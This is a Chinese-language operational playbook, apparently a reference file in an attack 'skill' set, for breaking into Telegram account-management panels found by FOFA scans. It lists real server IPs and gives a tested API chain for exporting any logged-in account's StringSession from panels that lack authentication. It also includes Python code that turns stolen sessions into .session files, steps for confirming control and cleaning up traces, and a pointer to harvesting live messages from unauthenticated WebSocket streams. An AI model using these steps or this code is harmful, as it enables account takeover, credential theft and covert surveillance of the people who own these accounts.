# 面板 session 出口能力矩阵 + 真 StringSession 导出链（0901 FOFA 四台实测）

## 1. 已破 TG 面板是否给真 session —— 四类能力判定

| 能力 | 端点特征 | 拿到的东西 | 案例 |
|---|---|---|---|
| 只读元数据 | `/api/accounts` 返回 phone 打码 / session 路径 | 电话簿，无 auth_key | BotShare / OTP接码 |
| 元数据+路径泄露 | session_file 字段**不打码** | 真实手机号映射表（从路径还原） | TG Toolkit 72.56：`sessions/242995446_telethon` → 9 个刚果号全还原 |
| 登录注入链 | `POST /api/login/send-code {phone, api_id, api_hash}` → `verify-code {session_token, code}` | 面板内落盘新 userbot/session | BotShare 2.56（api_id 23055122 实测打通，verify-code 成功 userbot#9） |
| 导入/导出双链 | `/api/sessions/import-string {phone, session_string}` + `GET /api/sessions/export/{phone}` | **真 StringSession 可读写 = 唯一完整出口** | TG营销 23.94.78.205 |

## 2. 真 StringSession 导出完整链（23.94.78.205 实测通过）

```
POST /api/accounts/telegram/send-code {phone, api_config_id}
  → {session_string: <353字符>, phone_code_hash}
  → 自有号收 777000 码（telethon get_messages(777000)）
POST /api/accounts/telegram/sign-in {phone, code, phone_code_hash, session_string, api_config_id}
  → 登录成功（account 落盘）
POST /api/sessions/import-string {phone, session_string}
  → 提示 file_path（泄露面板绝对路径 /www/wwwroot/TGKit/session/...）
GET  /api/sessions/export/{phone}
  → {phone, session_string} —— 完整 StringSession 到手
```

- 导出后立刻用 `TelegramClient(StringSession(ss), api_id, api_hash)` + `get_me()` 验证 authorized，再落盘交付
- 全程无认证（CWE-306 面板）时，**任何人**可用此链导出面板内任意已登录号（只要知道真实手机号）；phone 被服务端打码（`+861****3201`）则 export 404"Session不存在"——打码值不可用

## 3. StringSession → .session 文件落盘（正确姿势）

```python
c = TelegramClient(StringSession(ss), api_id, api_hash)  # 已授权
await c.connect(); me = await c.get_me()
from telethon.sessions import SQLiteSession
s = SQLiteSession(path)          # 目标 .session 路径
s.set_dc(c.session.dc_id, c.session.server_address, c.session.port)
s.auth_key = c.session.auth_key  # 必须从已授权客户端搬 auth_key
s.save(); s.close()
```

- 坑：直接 `TelegramClient(path)` connect 会**新建空 session**（is_user_authorized=False），因为面板 string 的 auth_key 没被写进去
- StringSession→tdata：面板 `convert/session-to-tdata` 多为 501 占位（"功能开发中"），别当可用面；本地构造见主 SKILL §2

## 4. 控制权验证 + 痕迹清理模式（注入类面板）

- 验证：`PATCH /{id}/toggle {is_active:false}` → ok；`DELETE /{id}/logout` → 回显 `deleted:{session_files:1, userbots:1,...}` = 面板确在磁盘删了 session
- 用自有测试号注入后**必须 logout/delete**，否则运营方面板会持续持有你的号（autojoin/gcast 会用你的号跑）

## 5. 与既有死路清单的关系

- telegram-manager 农场（217/95）="无任何导出路由"（SPA-404 全灭）
- 本节面板="有 import/export 路由但 phone 打码校验 / 无下载端点"
- 拿到 openapi 先判类：有 `/api/sessions/export/{phone}` 或 `/api/accounts/export/{phone}` = 可导出；只有元数据 = 只够做接管原语，session 本体留在服务器磁盘
- **第四类：WS 广播直播流**——HTTP API 全 401 但 WebSocket 漏挂鉴权 = 全部在线账号的实时消息监控位（收不到 session 文件本体）。探测/收割骨架/情报榨取/挂机值守见 `references/ws-live-stream-harvest.md`（TGCloudGB 103.179.143.124 实测：`/api/seat/ws` 裸连即推流，`{token:""}` 才断）
